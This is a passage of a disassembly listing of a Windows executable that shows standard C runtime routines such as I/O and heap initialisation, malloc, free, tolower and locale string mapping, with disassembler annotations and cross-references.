		mov	ecx, edi
		mov	edx, ecx
		shr	ecx, 2
		mov	edi, eax
		rep movsd
		mov	ecx, edx
		and	ecx, 3
		rep movsb
		mov	esi, [ebp+Memory]
		mov	ebx, eax

loc_1007ACC:				; CODE XREF: ___crtGetEnvironmentStringsA+101j
		push	esi		; LPCH
		call	ds:__imp__FreeEnvironmentStringsA@4 ; FreeEnvironmentStringsA(x)

loc_1007AD3:				; CODE XREF: ___crtGetEnvironmentStringsA+C7j
		mov	eax, ebx

loc_1007AD5:				; CODE XREF: ___crtGetEnvironmentStringsA+D4j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
___crtGetEnvironmentStringsA endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

__ioinit	proc near		; CODE XREF: _WinMainCRTStartup+FAp

StartupInfo	= _STARTUPINFOA	ptr -48h
var_4		= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 48h
		push	100h		; Size
		call	_malloc
		test	eax, eax
		pop	ecx
		jnz	short loc_1007AFB
		or	eax, 0FFFFFFFFh
		leave
		retn
; ---------------------------------------------------------------------------

loc_1007AFB:				; CODE XREF: __ioinit+15j
		mov	___pioinfo, eax
		mov	__nhandle, 20h
		lea	ecx, [eax+100h]
		jmp	short loc_1007B2C
; ---------------------------------------------------------------------------

loc_1007B12:				; CODE XREF: __ioinit+4Fj
		or	dword ptr [eax], 0FFFFFFFFh
		mov	byte ptr [eax+4], 0
		mov	byte ptr [eax+5], 0Ah
		mov	ecx, ___pioinfo
		add	eax, 8
		add	ecx, 100h

loc_1007B2C:				; CODE XREF: __ioinit+31j
		cmp	eax, ecx
		jb	short loc_1007B12
		push	ebx
		push	esi
		push	edi
		lea	eax, [ebp+StartupInfo]
		push	eax		; lpStartupInfo
		call	ds:__imp__GetStartupInfoA@4 ; GetStartupInfoA(x)
		cmp	[ebp+StartupInfo.cbReserved2], 0
		jz	loc_1007C12
		mov	eax, [ebp+StartupInfo.lpReserved2]
		test	eax, eax
		jz	loc_1007C12
		mov	edi, [eax]
		lea	ebx, [eax+4]
		lea	eax, [ebx+edi]
		mov	[ebp+var_4], eax
		mov	eax, 800h
		cmp	edi, eax
		jl	short loc_1007B69
		mov	edi, eax

loc_1007B69:				; CODE XREF: __ioinit+86j
		cmp	__nhandle, edi
		jge	short loc_1007BC3
		mov	esi, offset dword_1011B44

loc_1007B76:				; CODE XREF: __ioinit+DAj
		push	100h		; Size
		call	_malloc
		test	eax, eax
		pop	ecx
		jz	short loc_1007BBD
		add	__nhandle, 20h
		mov	[esi], eax
		lea	ecx, [eax+100h]
		jmp	short loc_1007BAC
; ---------------------------------------------------------------------------

loc_1007B96:				; CODE XREF: __ioinit+CFj
		or	dword ptr [eax], 0FFFFFFFFh
		mov	byte ptr [eax+4], 0
		mov	byte ptr [eax+5], 0Ah
		mov	ecx, [esi]
		add	eax, 8
		add	ecx, 100h

loc_1007BAC:				; CODE XREF: __ioinit+B5j
		cmp	eax, ecx
		jb	short loc_1007B96
		add	esi, 4
		cmp	__nhandle, edi
		jl	short loc_1007B76
		jmp	short loc_1007BC3
; ---------------------------------------------------------------------------

loc_1007BBD:				; CODE XREF: __ioinit+A4j
		mov	edi, __nhandle

loc_1007BC3:				; CODE XREF: __ioinit+90j __ioinit+DCj
		xor	esi, esi
		test	edi, edi
		jle	short loc_1007C12

loc_1007BC9:				; CODE XREF: __ioinit+131j
		mov	eax, [ebp+var_4]
		mov	ecx, [eax]
		cmp	ecx, 0FFFFFFFFh
		jz	short loc_1007C08
		mov	al, [ebx]
		test	al, 1
		jz	short loc_1007C08
		test	al, 8
		jnz	short loc_1007BE8
		push	ecx		; hFile
		call	ds:__imp__GetFileType@4	; GetFileType(x)
		test	eax, eax
		jz	short loc_1007C08

loc_1007BE8:				; CODE XREF: __ioinit+FCj
		mov	eax, esi
		sar	eax, 5
		mov	eax, ___pioinfo[eax*4]
		mov	ecx, esi
		and	ecx, 1Fh
		lea	eax, [eax+ecx*8]
		mov	ecx, [ebp+var_4]
		mov	ecx, [ecx]
		mov	[eax], ecx
		mov	cl, [ebx]
		mov	[eax+4], cl

loc_1007C08:				; CODE XREF: __ioinit+F2j __ioinit+F8j ...
		add	[ebp+var_4], 4
		inc	esi
		inc	ebx
		cmp	esi, edi
		jl	short loc_1007BC9

loc_1007C12:				; CODE XREF: __ioinit+63j __ioinit+6Ej ...
		xor	ebx, ebx

loc_1007C14:				; CODE XREF: __ioinit+197j
		mov	eax, ___pioinfo
		lea	esi, [eax+ebx*8]
		cmp	dword ptr [esi], 0FFFFFFFFh
		jnz	short loc_1007C6E
		test	ebx, ebx
		mov	byte ptr [esi+4], 81h
		jnz	short loc_1007C2E
		push	0FFFFFFF6h
		pop	eax
		jmp	short loc_1007C38
; ---------------------------------------------------------------------------

loc_1007C2E:				; CODE XREF: __ioinit+148j
		mov	eax, ebx
		dec	eax
		neg	eax
		sbb	eax, eax
		add	eax, 0FFFFFFF5h

loc_1007C38:				; CODE XREF: __ioinit+14Dj
		push	eax		; nStdHandle
		call	ds:__imp__GetStdHandle@4 ; GetStdHandle(x)
		mov	edi, eax
		cmp	edi, 0FFFFFFFFh
		jz	short loc_1007C5D
		push	edi		; hFile
		call	ds:__imp__GetFileType@4	; GetFileType(x)
		test	eax, eax
		jz	short loc_1007C5D
		and	eax, 0FFh
		cmp	eax, 2
		mov	[esi], edi
		jnz	short loc_1007C63

loc_1007C5D:				; CODE XREF: __ioinit+165j
					; __ioinit+170j
		or	byte ptr [esi+4], 40h
		jmp	short loc_1007C72
; ---------------------------------------------------------------------------

loc_1007C63:				; CODE XREF: __ioinit+17Cj
		cmp	eax, 3
		jnz	short loc_1007C72
		or	byte ptr [esi+4], 8
		jmp	short loc_1007C72
; ---------------------------------------------------------------------------

loc_1007C6E:				; CODE XREF: __ioinit+140j
		or	byte ptr [esi+4], 80h

loc_1007C72:				; CODE XREF: __ioinit+182j
					; __ioinit+187j ...
		inc	ebx
		cmp	ebx, 3
		jl	short loc_1007C14
		push	__nhandle	; uNumber
		call	ds:__imp__SetHandleCount@4 ; SetHandleCount(x)
		pop	edi
		pop	esi
		xor	eax, eax
		pop	ebx
		leave
		retn
__ioinit	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


___heap_select	proc near		; CODE XREF: __heap_init+24p
		cmp	__osplatform, 2
		jnz	short loc_1007CA6
		cmp	__winmajor, 5
		jb	short loc_1007CA6
		xor	eax, eax
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_1007CA6:				; CODE XREF: ___heap_select+7j
					; ___heap_select+10j
		push	3
		pop	eax
		retn
___heap_select	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

__heap_init	proc near		; CODE XREF: _WinMainCRTStartup+CBp

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		cmp	[ebp+arg_0], eax
		push	0		; dwMaximumSize
		setz	al
		push	1000h		; dwInitialSize
		push	eax		; flOptions
		call	ds:__imp__HeapCreate@12	; HeapCreate(x,x,x)
		test	eax, eax
		mov	__crtheap, eax
		jz	short loc_1007CFD
		call	___heap_select
		cmp	eax, 3
		mov	___active_heap,	eax
		jnz	short loc_1007D01
		push	3F8h
		call	___sbh_heap_init
		test	eax, eax
		pop	ecx
		jnz	short loc_1007D01
		push	__crtheap	; hHeap
		call	ds:__imp__HeapDestroy@4	; HeapDestroy(x)

loc_1007CFD:				; CODE XREF: __heap_init+22j
		xor	eax, eax
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_1007D01:				; CODE XREF: __heap_init+31j
					; __heap_init+40j
		xor	eax, eax
		inc	eax
		pop	ebp
		retn
__heap_init	endp

; ---------------------------------------------------------------------------
		db 6 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


__SEH_prolog	proc near		; CODE XREF: _WinMainCRTStartup+7p
					; ___crtLCMapStringA+7p ...

arg_4		= dword	ptr  8

		push	offset __except_handler3
		mov	eax, large fs:0
		push	eax
		mov	eax, [esp+8+arg_4]
		mov	[esp+8+arg_4], ebp
		lea	ebp, [esp+8+arg_4]
		sub	esp, eax
		push	ebx
		push	esi
		push	edi
		mov	eax, [ebp-8]
		mov	[ebp-18h], esp
		push	eax
		mov	eax, [ebp-4]
		mov	dword ptr [ebp-4], 0FFFFFFFFh
		mov	[ebp-8], eax
		lea	eax, [ebp-10h]
		mov	large fs:0, eax
		retn
__SEH_prolog	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


__SEH_epilog	proc near		; CODE XREF: _WinMainCRTStartup+1D6p
					; ___crtLCMapStringA+3C6p ...
		mov	ecx, [ebp-10h]
		mov	large fs:0, ecx
		pop	ecx
		pop	edi
		pop	esi
		pop	ebx
		leave
		push	ecx
		retn
__SEH_epilog	endp

; ---------------------------------------------------------------------------
		push	esi
		inc	ebx
		xor	dh, [eax]
		pop	eax
		inc	ebx
		xor	[eax], dh
; [000000E6 BYTES: COLLAPSED FUNCTION __except_handler3. PRESS KEYPAD "+" TO EXPAND]
; [0000001B BYTES: COLLAPSED FUNCTION _seh_longjmp_unwind(x). PRESS KEYPAD "+" TO EXPAND]
		align 10h

; =============== S U B	R O U T	I N E =======================================


__chkstk	proc near		; CODE XREF: _WinMainCRTStartup+13p
					; __NMSG_WRITE+110p ...

arg_0		= byte ptr  4

		cmp	eax, 1000h
		jnb	short loc_1007E85
		neg	eax
		add	eax, esp
		add	eax, 4
		test	[eax], eax
		xchg	eax, esp
		mov	eax, [eax]
		push	eax
		retn
; ---------------------------------------------------------------------------

loc_1007E85:				; CODE XREF: __chkstk+5j
		push	ecx
		lea	ecx, [esp+4+arg_0]

loc_1007E8A:				; CODE XREF: __chkstk+2Cj
		sub	ecx, 1000h
		sub	eax, 1000h
		test	[ecx], eax
		cmp	eax, 1000h
		jnb	short loc_1007E8A
		sub	ecx, eax
		mov	eax, esp
		test	[ecx], eax
		mov	esp, ecx
		mov	ecx, [eax]
		mov	eax, [eax+4]
		push	eax
		retn
__chkstk	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl tolower(int C)
_tolower	proc near		; CODE XREF: __stricmp+21p
					; __stricmp+2Dp ...

DestStr		= word ptr -8
MultiByteStr	= byte ptr -4
var_3		= byte ptr -3
var_2		= byte ptr -2
C		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		cmp	dword_10106FC, 0
		push	ebx
		mov	ebx, [ebp+C]
		push	esi
		push	edi
		jz	loc_1007F75
		cmp	___lc_clike, 0
		jz	short loc_1007EDE
		cmp	ebx, 7Fh
		jbe	loc_1007F75

loc_1007EDE:				; CODE XREF: _tolower+21j
		xor	esi, esi
		mov	edi, 100h
		inc	esi
		cmp	ebx, edi
		jnb	short loc_1007F0C
		cmp	___mb_cur_max, esi
		jle	short loc_1007EFD
		push	esi		; Type
		push	ebx		; C
		call	__isctype
		pop	ecx
		pop	ecx
		jmp	short loc_1007F08
; ---------------------------------------------------------------------------

loc_1007EFD:				; CODE XREF: _tolower+3Ej
		mov	eax, __pctype
		movzx	eax, byte ptr [eax+ebx*2]
		and	eax, esi

loc_1007F08:				; CODE XREF: _tolower+49j
		test	eax, eax
		jz	short loc_1007F82

loc_1007F0C:				; CODE XREF: _tolower+36j
		mov	edx, __pctype
		mov	eax, ebx
		sar	eax, 8
		movzx	ecx, al
		test	byte ptr [edx+ecx*2+1],	80h
		jz	short loc_1007F30
		push	2
		mov	[ebp+MultiByteStr], al
		mov	[ebp+var_3], bl
		mov	[ebp+var_2], 0
		pop	eax
		jmp	short loc_1007F39
; ---------------------------------------------------------------------------

loc_1007F30:				; CODE XREF: _tolower+6Dj
		mov	[ebp+MultiByteStr], bl
		mov	[ebp+var_3], 0
		mov	eax, esi

loc_1007F39:				; CODE XREF: _tolower+7Cj
		push	esi		; int
		push	___lc_codepage	; CodePage
		lea	ecx, [ebp+DestStr]
		push	3		; cchDest
		push	ecx		; lpDestStr
		push	eax		; cchSrc
		lea	eax, [ebp+MultiByteStr]
		push	eax		; lpMultiByteStr
		push	edi		; dwMapFlags
		push	dword_10106FC	; Locale
		call	___crtLCMapStringA
		add	esp, 20h
		test	eax, eax
		jz	short loc_1007F82
		cmp	eax, esi
		jnz	short loc_1007F68
		movzx	eax, byte ptr [ebp+DestStr]
		jmp	short loc_1007F84
; ---------------------------------------------------------------------------

loc_1007F68:				; CODE XREF: _tolower+AEj
		movzx	ecx, byte ptr [ebp+DestStr+1]
		xor	eax, eax
		mov	ah, byte ptr [ebp+DestStr]
		or	eax, ecx
		jmp	short loc_1007F84
; ---------------------------------------------------------------------------

loc_1007F75:				; CODE XREF: _tolower+14j _tolower+26j
		cmp	ebx, 41h
		jl	short loc_1007F82
		cmp	ebx, 5Ah
		lea	eax, [ebx+20h]
		jle	short loc_1007F84

loc_1007F82:				; CODE XREF: _tolower+58j _tolower+AAj ...
		mov	eax, ebx

loc_1007F84:				; CODE XREF: _tolower+B4j _tolower+C1j ...
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
_tolower	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___ascii_memicmp proc near

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	edi
		push	esi
		push	ebx
		mov	ecx, [ebp+arg_8]
		or	ecx, ecx
		jz	short loc_1007FDC
		mov	esi, [ebp+arg_0]
		mov	edi, [ebp+arg_4]
		mov	bh, 41h
		mov	bl, 5Ah
		mov	dh, 20h
		lea	ecx, [ecx+0]

loc_1007FAC:				; CODE XREF: ___ascii_memicmp+3Fj
		mov	ah, [esi]
		inc	esi
		mov	al, [edi]
		inc	edi
		cmp	ah, al
		jz	short loc_1007FCE
		cmp	ah, bh
		jb	short loc_1007FC0
		cmp	ah, bl
		ja	short loc_1007FC0
		add	ah, dh

loc_1007FC0:				; CODE XREF: ___ascii_memicmp+28j
					; ___ascii_memicmp+2Cj
		cmp	al, bh
		jb	short loc_1007FCA
		cmp	al, bl
		ja	short loc_1007FCA
		add	al, dh

loc_1007FCA:				; CODE XREF: ___ascii_memicmp+32j
					; ___ascii_memicmp+36j
		cmp	ah, al
		jnz	short loc_1007FD3

loc_1007FCE:				; CODE XREF: ___ascii_memicmp+24j
		dec	ecx
		jnz	short loc_1007FAC
		jmp	short loc_1007FDC
; ---------------------------------------------------------------------------

loc_1007FD3:				; CODE XREF: ___ascii_memicmp+3Cj
		mov	ecx, 0FFFFFFFFh
		jb	short loc_1007FDC
		neg	ecx

loc_1007FDC:				; CODE XREF: ___ascii_memicmp+Bj
					; ___ascii_memicmp+41j	...
		mov	eax, ecx
		pop	ebx
		pop	esi
		pop	edi
		leave
		retn
___ascii_memicmp endp

; ---------------------------------------------------------------------------
		align 8

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; void __cdecl free(void *Memory)
_free		proc near		; CODE XREF: operator delete(void *)+6j
					; sub_1006959+E9p ...

Memory		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+Memory]
		test	esi, esi
		jz	short loc_1008022
		cmp	___active_heap,	3
		push	esi
		jnz	short loc_1008014
		call	___sbh_find_block
		test	eax, eax
		pop	ecx
		push	esi
		jz	short loc_1008014
		push	eax
		call	___sbh_free_block
		pop	ecx
		pop	ecx
		jmp	short loc_1008022
; ---------------------------------------------------------------------------

loc_1008014:				; CODE XREF: _free+15j	_free+20j
		push	0		; dwFlags
		push	__crtheap	; hHeap
		call	ds:__imp__HeapFree@12 ;	HeapFree(x,x,x)

loc_1008022:				; CODE XREF: _free+Bj _free+2Aj
		pop	esi
		pop	ebp
		retn
_free		endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl _heap_alloc(SIZE_T dwBytes)
__heap_alloc	proc near		; CODE XREF: __nh_malloc+Ep

dwBytes		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		cmp	___active_heap,	3
		push	esi
		mov	esi, [ebp+dwBytes]
		jnz	short loc_100804F
		cmp	esi, ___sbh_threshold
		ja	short loc_100804F
		push	esi
		call	___sbh_alloc_block
		test	eax, eax
		pop	ecx
		jnz	short loc_1008072

loc_100804F:				; CODE XREF: __heap_alloc+10j
					; __heap_alloc+18j
		test	esi, esi
		jnz	short loc_1008054
		inc	esi

loc_1008054:				; CODE XREF: __heap_alloc+27j
		cmp	___active_heap,	1
		jz	short loc_1008063
		add	esi, 0Fh
		and	esi, 0FFFFFFF0h

loc_1008063:				; CODE XREF: __heap_alloc+31j
		push	esi		; dwBytes
		push	0		; dwFlags
		push	__crtheap	; hHeap
		call	ds:__imp__HeapAlloc@12 ; HeapAlloc(x,x,x)

loc_1008072:				; CODE XREF: __heap_alloc+23j
		pop	esi
		pop	ebp
		retn
__heap_alloc	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl _nh_malloc(SIZE_T	dwBytes, int)
__nh_malloc	proc near		; CODE XREF: operator new(uint)+Ap
					; _malloc+Ep

dwBytes		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		cmp	[ebp+dwBytes], 0FFFFFFE0h
		ja	short loc_10080A4

loc_1008085:				; CODE XREF: __nh_malloc+28j
		push	[ebp+dwBytes]	; dwBytes
		call	__heap_alloc
		test	eax, eax
		pop	ecx
		jnz	short loc_10080A6
		cmp	[ebp+arg_4], eax
		jz	short loc_10080A6
		push	[ebp+dwBytes]
		call	__callnewh
		test	eax, eax
		pop	ecx
		jnz	short loc_1008085

loc_10080A4:				; CODE XREF: __nh_malloc+9j
		xor	eax, eax

loc_10080A6:				; CODE XREF: __nh_malloc+16j
					; __nh_malloc+1Bj
		pop	ebp
		retn
__nh_malloc	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; void *__cdecl	malloc(size_t Size)
_malloc		proc near		; CODE XREF: sub_1006959+1Cp
					; sub_1006C05+A5p ...

dwBytes		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	__newmode	; int
		push	[ebp+dwBytes]	; dwBytes
		call	__nh_malloc
		pop	ecx
		pop	ecx
		pop	ebp
		retn
_malloc		endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl __crtLCMapStringA(LCID Locale, DWORD dwMapFlags, LPCSTR lpMultiByteStr, int cchSrc, LPWSTR lpDestStr, int	cchDest, UINT CodePage,	int)
___crtLCMapStringA proc	near		; CODE XREF: _toupper+A3p _tolower+A0p ...

var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
Size		= dword	ptr -24h
Memory		= dword	ptr -20h
lpSrcStr	= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h
Locale		= dword	ptr  8
dwMapFlags	= dword	ptr  0Ch
lpMultiByteStr	= dword	ptr  10h
cchSrc		= dword	ptr  14h
lpDestStr	= dword	ptr  18h
cchDest		= dword	ptr  1Ch
CodePage	= dword	ptr  20h
arg_1C		= dword	ptr  24h

		push	34h
		push	offset stru_1002370
		call	__SEH_prolog
		xor	edi, edi
		cmp	dword_1010714, edi
		jnz	short loc_1008117
		push	edi		; cchDest
		push	edi		; lpDestStr
		xor	esi, esi
		inc	esi
		push	esi		; cchSrc
		push	offset SrcStr	; lpSrcStr
		push	100h		; dwMapFlags
		push	edi		; Locale
		call	ds:__imp__LCMapStringW@24 ; LCMapStringW(x,x,x,x,x,x)
		test	eax, eax
		jz	short loc_1008102
		mov	dword_1010714, esi
		jmp	short loc_1008117
; ---------------------------------------------------------------------------

loc_1008102:				; CODE XREF: ___crtLCMapStringA+2Fj
		call	ds:__imp__GetLastError@0 ; GetLastError()
		cmp	eax, 78h
		jnz	short loc_1008117
		mov	dword_1010714, 2

loc_1008117:				; CODE XREF: ___crtLCMapStringA+14j
					; ___crtLCMapStringA+37j ...
		cmp	[ebp+cchSrc], edi
		jle	short loc_1008138
		mov	ecx, [ebp+cchSrc]
		mov	eax, [ebp+lpMultiByteStr]

loc_1008122:				; CODE XREF: ___crtLCMapStringA+62j
		dec	ecx
		cmp	byte ptr [eax],	0
		jz	short loc_1008130
		inc	eax
		cmp	ecx, edi
		jnz	short loc_1008122
		or	ecx, 0FFFFFFFFh

loc_1008130:				; CODE XREF: ___crtLCMapStringA+5Dj
		or	eax, 0FFFFFFFFh
		sub	eax, ecx
		add	[ebp+cchSrc], eax

loc_1008138:				; CODE XREF: ___crtLCMapStringA+51j
		mov	eax, dword_1010714
		cmp	eax, 2
		jz	loc_1008324
		cmp	eax, edi
		jz	loc_1008324
		cmp	eax, 1
		jnz	loc_1008357
		mov	[ebp+var_2C], edi
		mov	[ebp+var_38], edi
		mov	[ebp+var_34], edi
		cmp	[ebp+CodePage],	edi
		jnz	short loc_100816D
		mov	eax, ___lc_codepage
		mov	[ebp+CodePage],	eax

loc_100816D:				; CODE XREF: ___crtLCMapStringA+9Aj
		push	edi		; cchWideChar
		push	edi		; lpWideCharStr
		push	[ebp+cchSrc]	; cbMultiByte
		push	[ebp+lpMultiByteStr] ; lpMultiByteStr
		xor	eax, eax
		cmp	[ebp+arg_1C], edi
		setnz	al
		lea	eax, ds:1[eax*8]
		push	eax		; dwFlags
		push	[ebp+CodePage]	; CodePage
		call	ds:__imp__MultiByteToWideChar@24 ; MultiByteToWideChar(x,x,x,x,x,x)
		mov	esi, eax
		mov	[ebp+var_30], esi
		xor	ebx, ebx
		cmp	esi, ebx
		jz	loc_1008357
		mov	[ebp+ms_exc.disabled], 1
		lea	eax, [esi+esi]
		add	eax, 3
		and	eax, 0FFFFFFFCh
		call	__chkstk
		mov	[ebp+ms_exc.old_esp], esp
		mov	eax, esp
		mov	[ebp+lpSrcStr],	eax
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		jmp	short loc_10081DC
; ---------------------------------------------------------------------------

loc_10081C0:				; DATA XREF: .text:stru_1002370o
		xor	eax, eax	; Exception filter 1 for function 10080C9
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_10081C4:				; DATA XREF: .text:stru_1002370o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 1	for function 10080C9
		call	__resetstkoflw
		and	[ebp+lpSrcStr],	0
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		mov	edi, [ebp+var_2C]
		mov	esi, [ebp+var_30]
		xor	ebx, ebx

loc_10081DC:				; CODE XREF: ___crtLCMapStringA+F5j
		cmp	[ebp+lpSrcStr],	ebx
		jnz	short loc_10081FD
		lea	eax, [esi+esi]
		push	eax		; Size
		call	_malloc
		pop	ecx
		mov	[ebp+lpSrcStr],	eax
		cmp	eax, ebx
		jz	loc_1008357
		mov	[ebp+var_38], 1

loc_10081FD:				; CODE XREF: ___crtLCMapStringA+116j
		push	esi		; cchWideChar
		push	[ebp+lpSrcStr]	; lpWideCharStr
		push	[ebp+cchSrc]	; cbMultiByte
		push	[ebp+lpMultiByteStr] ; lpMultiByteStr
		push	1		; dwFlags
		push	[ebp+CodePage]	; CodePage
		call	ds:__imp__MultiByteToWideChar@24 ; MultiByteToWideChar(x,x,x,x,x,x)
		test	eax, eax
		jz	loc_1008301
		push	ebx		; cchDest
		push	ebx		; lpDestStr
		push	esi		; cchSrc
		push	[ebp+lpSrcStr]	; lpSrcStr
		push	[ebp+dwMapFlags] ; dwMapFlags
		push	[ebp+Locale]	; Locale
		call	ds:__imp__LCMapStringW@24 ; LCMapStringW(x,x,x,x,x,x)
		mov	edi, eax
		mov	[ebp+var_2C], edi
		cmp	edi, ebx
		jz	loc_1008301
		test	byte ptr [ebp+dwMapFlags+1], 4
		jz	short loc_100826C
		cmp	[ebp+cchDest], ebx
		jz	loc_1008301
		cmp	edi, [ebp+cchDest]
		jg	loc_1008301
		push	[ebp+cchDest]	; cchDest
		push	[ebp+lpDestStr]	; lpDestStr
		push	esi		; cchSrc
		push	[ebp+lpSrcStr]	; lpSrcStr
		push	[ebp+dwMapFlags] ; dwMapFlags
		push	[ebp+Locale]	; Locale
		call	ds:__imp__LCMapStringW@24 ; LCMapStringW(x,x,x,x,x,x)
		jmp	loc_1008301
; ---------------------------------------------------------------------------

loc_100826C:				; CODE XREF: ___crtLCMapStringA+174j
		mov	[ebp+ms_exc.disabled], 2
		lea	eax, [edi+edi]
		add	eax, 3
		and	eax, 0FFFFFFFCh
		call	__chkstk
		mov	[ebp+ms_exc.old_esp], esp
		mov	eax, esp
		mov	[ebp+Memory], eax
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		jmp	short loc_10082AB
; ---------------------------------------------------------------------------

loc_100828F:				; DATA XREF: .text:stru_1002370o
		xor	eax, eax	; Exception filter 2 for function 10080C9
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_1008293:				; DATA XREF: .text:stru_1002370o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 2	for function 10080C9
		call	__resetstkoflw
		and	[ebp+Memory], 0
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		mov	edi, [ebp+var_2C]
		mov	esi, [ebp+var_30]
		xor	ebx, ebx

loc_10082AB:				; CODE XREF: ___crtLCMapStringA+1C4j
		cmp	[ebp+Memory], ebx
		jnz	short loc_10082C8
		lea	eax, [edi+edi]
		push	eax		; Size
		call	_malloc
		pop	ecx
		mov	[ebp+Memory], eax
		cmp	eax, ebx
		jz	short loc_1008301
		mov	[ebp+var_34], 1

loc_10082C8:				; CODE XREF: ___crtLCMapStringA+1E5j
		push	edi		; cchDest
		push	[ebp+Memory]	; lpDestStr
		push	esi		; cchSrc
		push	[ebp+lpSrcStr]	; lpSrcStr
		push	[ebp+dwMapFlags] ; dwMapFlags
		push	[ebp+Locale]	; Locale
		call	ds:__imp__LCMapStringW@24 ; LCMapStringW(x,x,x,x,x,x)
		test	eax, eax
		jz	short loc_1008301
		push	ebx		; lpUsedDefaultChar
		push	ebx		; lpDefaultChar
		cmp	[ebp+cchDest], ebx
		jnz	short loc_10082EB
		push	ebx
		push	ebx
		jmp	short loc_10082F1
; ---------------------------------------------------------------------------

loc_10082EB:				; CODE XREF: ___crtLCMapStringA+21Cj
		push	[ebp+cchDest]	; cbMultiByte
		push	[ebp+lpDestStr]	; lpMultiByteStr

loc_10082F1:				; CODE XREF: ___crtLCMapStringA+220j
		push	edi		; cchWideChar
		push	[ebp+Memory]	; lpWideCharStr
		push	ebx		; dwFlags
		push	[ebp+CodePage]	; CodePage
		call	ds:__imp__WideCharToMultiByte@32 ; WideCharToMultiByte(x,x,x,x,x,x,x,x)
		mov	edi, eax

loc_1008301:				; CODE XREF: ___crtLCMapStringA+14Bj
					; ___crtLCMapStringA+16Aj ...
		cmp	[ebp+var_34], ebx
		jz	short loc_100830F
		push	[ebp+Memory]	; Memory
		call	_free
		pop	ecx

loc_100830F:				; CODE XREF: ___crtLCMapStringA+23Bj
		cmp	[ebp+var_38], ebx
		jz	short loc_100831D
		push	[ebp+lpSrcStr]	; Memory
		call	_free
		pop	ecx

loc_100831D:				; CODE XREF: ___crtLCMapStringA+249j
		mov	eax, edi
		jmp	loc_100848C
; ---------------------------------------------------------------------------

loc_1008324:				; CODE XREF: ___crtLCMapStringA+77j
					; ___crtLCMapStringA+7Fj
		mov	[ebp+var_28], edi
		xor	ebx, ebx
		mov	[ebp+var_3C], edi
		cmp	[ebp+Locale], edi
		jnz	short loc_1008339
		mov	eax, dword_10106FC
		mov	[ebp+Locale], eax

loc_1008339:				; CODE XREF: ___crtLCMapStringA+266j
		cmp	[ebp+CodePage],	edi
		jnz	short loc_1008346
		mov	eax, ___lc_codepage
		mov	[ebp+CodePage],	eax

loc_1008346:				; CODE XREF: ___crtLCMapStringA+273j
		push	[ebp+Locale]	; Locale
		call	___ansicp
		pop	ecx
		mov	[ebp+var_40], eax
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_100835E

loc_1008357:				; CODE XREF: ___crtLCMapStringA+88j
					; ___crtLCMapStringA+CEj ...
		xor	eax, eax
		jmp	loc_100848C
; ---------------------------------------------------------------------------

loc_100835E:				; CODE XREF: ___crtLCMapStringA+28Cj
		cmp	eax, [ebp+CodePage]
		jz	loc_1008461
		push	edi		; int
		push	edi		; int
		lea	ecx, [ebp+cchSrc]
		push	ecx		; int
		push	[ebp+lpMultiByteStr] ; lpMultiByteStr
		push	eax		; int
		push	[ebp+CodePage]	; CodePage
		call	___convertcp
		add	esp, 18h
		mov	[ebp+var_28], eax
		cmp	eax, edi
		jz	short loc_1008357
		push	edi		; cchDest
		push	edi		; lpDestStr
		push	[ebp+cchSrc]	; cchSrc
		push	eax		; lpSrcStr
		push	[ebp+dwMapFlags] ; dwMapFlags
		push	[ebp+Locale]	; Locale
		call	ds:__imp__LCMapStringA@24 ; LCMapStringA(x,x,x,x,x,x)
		mov	esi, eax
		mov	[ebp+Size], esi
		test	esi, esi
		jz	loc_100842D
